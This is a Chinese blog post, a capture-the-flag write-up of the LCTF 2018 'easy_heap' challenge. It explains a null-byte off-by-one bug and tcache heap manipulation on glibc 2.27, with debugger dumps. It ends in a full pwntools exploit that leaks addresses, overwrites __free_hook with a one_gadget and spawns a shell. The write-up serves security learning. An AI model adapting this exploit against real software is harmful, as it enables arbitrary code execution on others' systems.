<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">LCTF—easypwn详解 | nepire的舰队</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "艦隊nepire";
  mashiro_option.author_name = "nepire";
  mashiro_option.site_url = "https://nepire.github.io/";
  mashiro_option.v_appId = "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz";
  mashiro_option.v_appKey = "EEpyRysaKmv7aOJjR1o9E4Eq";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "/images/cover/(0).jpg,/images/cover/(1).jpg,/images/cover/(2).jpg,/images/cover/(3).jpg".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
</head>
</html>
<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://nepire.github.io/">
          <img src="/images/title.ico">
        </a>
      </div>
      <div class="header-info">
        <p>渴求着能撼动世界的力量</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="github">
                    <img src="/images/social/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="sina">
                    <img src="/images/social/sina.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="wangyiyun">
                    <img src="/images/social/wangyiyun.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="zhihu">
                    <img src="/images/social/zhihu.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="email">
                    <img src="/images/social/email.svg">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="/images/social/wechat.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/wechat.jpg">
                  </div>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">艦隊</span>
            <span class="shironeko">nepire</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/技术/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/生活/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          生活
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/资源/">
                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
                          资源
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/tags/悦读/">
                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                          书单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/bangumi/">
                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                          番组
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/图集/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                      <li>
                        <a href="/theme-sakura/">
                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                          主题
                        </a>
                      </li>
                    
                      <li>
                        <a href="/lab/">
                          <i class="fa fa-cogs" aria-hidden="true"></i>
                          Lab
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/client/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
                    客户端
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img lazyload" style="background-image: url(https://p3.ssl.qhimg.com/t017e44e60793f4b08a.png);" src="" data-src="https://p3.ssl.qhimg.com/t017e44e60793f4b08a.png">
    </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      LCTF—easypwn详解</h1>
      <p class="entry-census">
        <span>
          <a href="https://nepire.github.io/">
            <img src="/images/title.ico">
          </a>
        </span>
        <span>
          <a href="https://nepire.github.io/">nepire</a>
        </span>
        <span class="bull">
        ·</span>
        2019-11-5<span class="bull">
        ·</span>
      <span id="busuanzi_value_page_pv"></span>次阅读</p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <p>听说一血有pwnhub注册码拿就去试着打了一下周末的这场LCTF，结果作为签到题选手(笑)连签到题的一血都拿不到可能这就是命吧，不过遇到了一题不错的pwn，就详细的记录下解题思路和技巧吧</p>
<p>本文首发于<a href="https://www.anquanke.com/post/id/164591" target="_blank" rel="noopener">安全客—LCTF2018-easypwn-详细解析</a></p>
<h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy pwn"></a>easy pwn</h2><p>先看下给的文件的基本信息</p>
<pre><code class="bash">➜  easy_heap file easy_heap
easy_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped
➜  easy_heap checksec easy_heap
[*] &#39;/home/Ep3ius/pwn/process/easy_heap/easy_heap&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>64位程序防护基本全开，接着我们ida看下程序反编译的结果</p>
<pre><code class="c">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int choice; // eax

  init_0();
  chunk_menu = calloc(0xA0uLL, 1uLL);
  if ( !chunk_menu )
  {
    puts(&quot;init error!&quot;);
    exit_();
  }
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = read_input();
      if ( choice != 2 )
        break;
      delete();
    }
    if ( choice &gt; 2 )
    {
      if ( choice == 3 )
      {
        show();
      }
      else if ( choice == 4 )
      {
        exit_();
      }
    }
    else if ( choice == 1 )
    {
      new();
    }
  }
}
</code></pre>
<p>我们可以看到这是一个基础的菜单型程序，这里比较在意的是程序先calloc了一个0xa0大小的堆块，我们先了解下malloc和 calloc的区别主要在于calloc在动态分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是随机的垃圾数据。</p>
<pre><code class="c">void new()
{
  __int64 v0; // rbx
  __int64 idx; // [rsp+0h] [rbp-20h]
  int idxa; // [rsp+0h] [rbp-20h]
  unsigned int chunk_size; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  LODWORD(idx) = 0;
  while ( idx &lt;= 9 &amp;&amp; *(16LL * idx + chunk_menu) )
    LODWORD(idx) = idx + 1;
  if ( idx == 10 )
  {
    puts(&quot;full!&quot;);
  }
  else
  {
    v0 = chunk_menu;
    *(v0 + 16LL * idx) = malloc(0xF8uLL);
    if ( !*(16LL * idx + chunk_menu) )
    {
      puts(&quot;malloc error!&quot;);
      exit_();
    }
    printf(&quot;size \n&gt; &quot;, idx, v4);
    chunk_size = read_input();
    if ( chunk_size &gt; 0xF8 )
      exit_();
    *(16LL * idxa + chunk_menu + 8) = chunk_size;
    printf(&quot;content \n&gt; &quot;);
    read_input_content(*(16LL * idxa + chunk_menu), *(16LL * idxa + chunk_menu + 8));
  }
}
</code></pre>
<p>我们可以看到可以new的chunk的数量是最多时10个，并且malloc的新chunk位置都是在开头calloc的chunk后面，并且content的输入方式单独写了个函数，我们跟进去看看</p>
<pre><code class="c">void __fastcall read_input_content(_BYTE *input, int chunk_size)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]

  i = 0;
  if ( chunk_size )
  {
    while ( 1 )
    {
      read(0, &amp;input[i], 1uLL);
      if ( chunk_size - 1 &lt; i || !input[i] || input[i] == &#39;\n&#39; )
        break;
      ++i;
    }
    input[i] = 0;
    input[chunk_size] = 0;    #null byte off-by-one
  }
  else
  {
    *input = 0;
  }
}
</code></pre>
<p>我们结合前面的SIZE_MAX = 0xF8和malloc的都是0xF8可以发现，当我们new一个size=0xF8的chunk时他会把input[0xf8]赋值为0，但这就相当于把下一个chunk的size位覆盖了一个字节，我们具体调试一下</p>
<pre><code class="python">#poc
new(0x10,&#39;aaaa&#39;) #0
new(0x10,&#39;aaaa&#39;) #1
free(0)
new(0xf8,&#39;a&#39;*0xf8) #0
</code></pre>
<pre><code class="bash">pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
0x558c833fa000      0x0                 0x250                Used                None              None
0x558c833fa250      0x0                 0xb0                 Used                None              None
0x558c833fa300      0x0                 0x100                Used                None              None
0x558c833fa400      0x0                 0x100                Used                None              None
pwndbg&gt; x/8x 0x558c833fa400
0x558c833fa400:    0x0000000000000000    0x0000000000000101
0x558c833fa410:    0x0000000062626262    0x0000000000000000
0x558c833fa420:    0x0000000000000000    0x0000000000000000
0x558c833fa430:    0x0000000000000000    0x0000000000000000
# new(0xf8,&#39;a&#39;*0xf8)
pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
0x558c833fa000      0x0                 0x250                Used                None              None
0x558c833fa250      0x0                 0xb0                 Used                None              None
0x558c833fa300      0x0                 0x100                Freed 0x61616161616161610x6161616161616161
0x558c833fa400      0x6161616161616161  0x100                Used                None              None
pwndbg&gt; x/8x 0x558c833fa400
0x558c833fa400:    0x6161616161616161    0x0000000000000100  &lt;== null byte overwrite
0x558c833fa410:    0x0000000062626262    0x0000000000000000
0x558c833fa420:    0x0000000000000000    0x0000000000000000
0x558c833fa430:    0x0000000000000000    0x0000000000000000
pwndbg&gt;
</code></pre>
<p>我们可以看到chunk1的size位确实被\x00所覆盖了，也证明确实只要size=0xf8就可以overwrite一字节到下一个chunk的size位</p>
<p>接着我们看下delete和show函数</p>
<pre><code class="c">void delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]

  printf(&quot;index \n&gt; &quot;);
  idx = read_input();
  if ( idx &gt; 9 || !*(16LL * idx + chunk_menu) )
    exit_();
  memset(*(16LL * idx + chunk_menu), 0, *(16LL * idx + chunk_menu + 8));
  free(*(16LL * idx + chunk_menu));
  *(16LL * idx + chunk_menu + 8) = 0;
  *(16LL * idx + chunk_menu) = 0LL;
}
</code></pre>
<pre><code class="c">void show()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]

  printf(&quot;index \n&gt; &quot;);
  idx = read_input();
  if ( idx &gt; 9 || !*(16LL * idx + chunk_menu) )
    exit_();
  puts(*(16LL * idx + chunk_menu));
}
</code></pre>
<p>中规中矩，没有什么问题</p>
<p>分析完了在这里卡了很久，后来在调题目给的libc时秉持着瞎猫一般是能碰到死耗子的原则查了下libc的版本，结果还真的找到了是2.27</p>
<p><img src="E:\CTF\博客\投稿__LCTF—easypwn详解.assets\1542542505625.png" alt="1542542505625"></p>
<p>要考虑tcache，马上切了个环境去调试(在这之前快被各种double free报错搞死了，哭)</p>
<p>我们先布局好7、8、9号堆</p>
<pre><code class="python">new_tcache()
new(0x10,&#39;aaaa&#39;) #7
new(0x10,&#39;bbbb&#39;) #8
new(0x10,&#39;cccc&#39;) #9
free_tcache()
free(7)
free(8)
free(9)
</code></pre>
<p>然后下面的操作看上去可能会很绕但想明白了就很明了了，我们先把0-6从tcache取出new好7、8、9号堆后再放回tcache后把chunk7释放这时我们再看下chunk7的状态</p>
<pre><code class="bash">pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
0x564965142000      0x0                 0x250                Used                None              None
0x564965142250      0x0                 0xb0                 Used                None              None
0x564965142300      0x0                 0x100                Used                None              None
0x564965142400      0x0                 0x100                Used                None              None
0x564965142500      0x0                 0x100                Used                None              None
0x564965142600      0x0                 0x100                Used                None              None
0x564965142700      0x0                 0x100                Used                None              None
0x564965142800      0x0                 0x100                Used                None              None
0x564965142900      0x0                 0x100                Used                None              None
0x564965142a00      0x0                 0x100                Freed     0x7fa21366eca0    0x7fa21366eca0
0x564965142b00      0x100               0x100                Used                None              None
0x564965142c00      0x200               0x100                Used                None              None
pwndbg&gt; x/8x 0x564965142a00
0x564965142a00:    0x0000000000000000    0x0000000000000101
0x564965142a10:    0x00007fa21366eca0    0x00007fa21366eca0
0x564965142a20:    0x0000000000000000    0x0000000000000000
0x564965142a30:    0x0000000000000000    0x0000000000000000
pwndbg&gt;
</code></pre>
<p>已经把main_arena放入在chunk里了，这时我们再把tcache清空后free8再重新取回来让chunk8_size=0xf8触发null byte off-by-one覆盖chunk9的previnuse位为0，让我们看下chunk现在的情况</p>
<pre><code class="bash">pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk  
0x556bf9a1e000      0x0                 0x250                Used                None              None
0x556bf9a1e250      0x0                 0xb0                 Used                None              None
0x556bf9a1e300      0x0                 0x100                Used                None              None
0x556bf9a1e400      0x0                 0x100                Used                None              None
0x556bf9a1e500      0x0                 0x100                Used                None              None
0x556bf9a1e600      0x0                 0x100                Used                None              None
0x556bf9a1e700      0x0                 0x100                Used                None              None
0x556bf9a1e800      0x0                 0x100                Used                None              None
0x556bf9a1e900      0x0                 0x100                Used                None              None
0x556bf9a1ea00      0x0                 0x100                Freed     0x7f003ff88ca0    0x7f003ff88ca0
0x556bf9a1eb00      0x100               0x100                Freed 0x746972777265766f          0x392065
0x556bf9a1ec00      0x200               0x100                Used                None              None
pwndbg&gt; x/8x 0x556bf9a1ea00
0x556bf9a1ea00:    0x0000000000000000    0x0000000000000101
0x556bf9a1ea10:    0x00007f003ff88ca0    0x00007f003ff88ca0
0x556bf9a1ea20:    0x0000000000000000    0x0000000000000000
0x556bf9a1ea30:    0x0000000000000000    0x0000000000000000
pwndbg&gt; x/8x 0x556bf9a1eb00
0x556bf9a1eb00:    0x0000000000000100    0x0000000000000100
0x556bf9a1eb10:    0x746972777265766f    0x0000000000392065
0x556bf9a1eb20:    0x0000000000000000    0x0000000000000000
0x556bf9a1eb30:    0x0000000000000000    0x0000000000000000
pwndbg&gt; x/8x 0x556bf9a1ec00
0x556bf9a1ec00:    0x0000000000000200    0x0000000000000100
0x556bf9a1ec10:    0x0000000063636363    0x0000000000000000
0x556bf9a1ec20:    0x0000000000000000    0x0000000000000000
0x556bf9a1ec30:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>这时我们可以看到chunk9的pre_size位位0x200chunk9的previnuse位也为0，就可以尝试一波unlink了，先把tcache填满，再free9后，我们再看下chunk</p>
<pre><code class="bash">pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
0x5624364b4000      0x0                 0x250                Used                None              None
0x5624364b4250      0x0                 0xb0                 Used                None              None
0x5624364b4300      0x0                 0x100                Used                None              None
0x5624364b4400      0x0                 0x100                Used                None              None
0x5624364b4500      0x0                 0x100                Used                None              None
0x5624364b4600      0x0                 0x100                Used                None              None
0x5624364b4700      0x0                 0x100                Used                None              None
0x5624364b4800      0x0                 0x100                Used                None              None
0x5624364b4900      0x0                 0x100                Used                None              None
</code></pre>
<p>我们接着把tcache清空，新建chunk9和overwrite到chunk8的chunk7，再把chunk6和chunk9释放掉后，这时chunk7里存的就是heap地址了，show(7)便可以泄露heapbase</p>
<pre><code class="bash">pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk
0x55fe2fe46000      0x0                 0x250                Used                None              None
0x55fe2fe46250      0x0                 0xb0                 Used                None              None
0x55fe2fe46300      0x0                 0x100                Used                None              None
0x55fe2fe46400      0x0                 0x100                Used                None              None
0x55fe2fe46500      0x0                 0x100                Used                None              None
0x55fe2fe46600      0x0                 0x100                Used                None              None
0x55fe2fe46700      0x0                 0x100                Used                None              None
0x55fe2fe46800      0x0                 0x100                Used                None              None
0x55fe2fe46900      0x0                 0x100                Used                None              None
0x55fe2fe46a00      0x0                 0x100                Used                None              None
0x55fe2fe46b00      0x100               0x100                Used                None              None
pwndbg&gt; x/8x 0x55fe2fe46b00
0x55fe2fe46b00:    0x0000000000000100        0x0000000000000101
0x55fe2fe46b10:    0x000055fe2fe46310 &lt;==    0x0000000000000000
0x55fe2fe46b20:    0x0000000000000000        0x0000000000000000
0x55fe2fe46b30:    0x0000000000000000        0x0000000000000000
</code></pre>
<p>之后就是想办法去泄露libc地址了，这步也卡了很久，本来是想通过tcache_dup修改chunk7里的数据改成那个存着libc地址的地址，后来发现真的被自己蠢哭，最后我是把chunk_menu也就是一开始calloc的0xb0的chunk里面chunk7的指针通过tcache_dup改成存着libc地址的chunk再leak出来</p>
<pre><code class="bash">pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x565551ed3c00 (size : 0x20400)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x100)   tcache_entry[14]:0x565551ed3b10 --&gt; 0x565551ed3b10 (overlap chunk with 0x565551ed3b00(freed) )
pwndbg&gt; parseheap
addr                prev                size                 status              fd                bk                
0x565551ed3000      0x0                 0x250                Used                None              None
0x565551ed3250      0x0                 0xb0                 Used                None              None
0x565551ed3300      0x0                 0x100                Used                None              None
0x565551ed3400      0x0                 0x100                Used                None              None
0x565551ed3500      0x0                 0x100                Used                None              None
0x565551ed3600      0x0                 0x100                Used                None              None
0x565551ed3700      0x0                 0x100                Used                None              None
0x565551ed3800      0x0                 0x100                Used                None              None
0x565551ed3900      0x0                 0x100                Used                None              None
0x565551ed3a00      0x0                 0x100                Used                None              None
0x565551ed3b00      0x100               0x100                Used                None              None
pwndbg&gt;
</code></pre>
<p>在泄露出了libc地址后基本就是为所欲为了，重新做个tcache_dup把free_hook修改成one_gadget就直接getshell了，这里贴上exp</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
n = process(&#39;./easy_heap&#39;)
#n = remote(&#39;118.25.150.134&#39;,6666)
elf = ELF(&#39;./easy_heap&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def new_0():
    n.recvuntil(&#39;which command?\n&gt; &#39;)
    n.sendline(&quot;1&quot;)
    n.recvuntil(&#39;&gt; &#39;)
    n.sendline(&#39;0&#39;)

def new(size,content):
    n.recvuntil(&#39;which command?\n&gt; &#39;)
    n.sendline(&quot;1&quot;)
    n.recvuntil(&#39;size \n&gt; &#39;)
    n.sendline(str(size))
    n.recvuntil(&#39;content \n&gt; &#39;)
    n.sendline(content)

def free(idx):
    n.recvuntil(&#39;which command?\n&gt; &#39;)
    n.sendline(&quot;2&quot;)
    n.recvuntil(&#39;index \n&gt; &#39;)
    n.sendline(str(idx))

def show(idx):
    n.recvuntil(&#39;which command?\n&gt; &#39;)
    n.sendline(&quot;3&quot;)
    n.recvuntil(&#39;index \n&gt; &#39;)
    n.sendline(str(idx))

def new_tcache():
    for i in range(7):
        new(0x10,&#39;aaaa&#39;)

def free_tcache():
    for i in range(0,7):
        free(i)

new_tcache()
new(0x10,&#39;aaaa&#39;) #7
new(0x10,&#39;bbbb&#39;) #8
new(0x10,&#39;cccc&#39;) #9
free_tcache()

free(7)
free(8)
free(9)

new_tcache()
new(0x10,&#39;aaaa&#39;) #7
new(0x10,&#39;bbbb&#39;) #8
new(0x10,&#39;cccc&#39;) #9

free_tcache()
free(7)


new_tcache()
free(8)
new(0xf8,&#39;overwrite 9&#39;)

free_tcache()
free(9)

new_tcache()
new(0x10,&#39;aaaa&#39;) #9
new(0x10,&#39;bbbb&#39;) #7(8)
free(6)
free(9)
show(7)

heap_base = u64(n.recv(6)+&#39;\x00\x00&#39;)
print hex(heap_base)

free(7)
new(0xf0,p64(heap_base-64)) #7
new(0xf0,&#39;aaaa&#39;) #7_2
new(0xf0,p64(heap_base+0x700+0x8))
show(7)
libc_base = u64(n.recv(6)+&#39;\x00\x00&#39;) - 0x3ebca0
print hex(libc_base)
free_hook = libc.symbols[&#39;__free_hook&#39;]+libc_base
print &quot;free_hook&quot;,hex(free_hook)
one_gadget = libc_base + 0x4f322

free(6)
free(9)
new(0xf0,p64(free_hook))
new(0xf0,&#39;aaaa&#39;)
new(0xf0,p64(one_gadget))


n.interactive()
</code></pre>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次LCTF学到了不少，感谢丁佬没打死我还告诉我调试得出来puts出来的是里面的值里面不是指针，下次一定要好好学习跟上大哥们的解题速度</p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="null"></li>
                <li class="wechat-code"><img src="null"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2019/11/05/在debug中学tcache/" rel="prev">
              <div class="background">
                <img class="lazyload" src="" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                在debug中学tcache</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2019/11/05/picoCTFのpwn解析/" rel="next">
              <div class="background">
                <img class="lazyload" src="" data-src="https://p2.ssl.qhimg.com/t01f20b1ea3950aa6f6.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://p2.ssl.qhimg.com/t01f20b1ea3950aa6f6.jpg">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                picoCTFのpwn解析</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz",
        appKey: "EEpyRysaKmv7aOJjR1o9E4Eq",
        path: window.location.pathname,
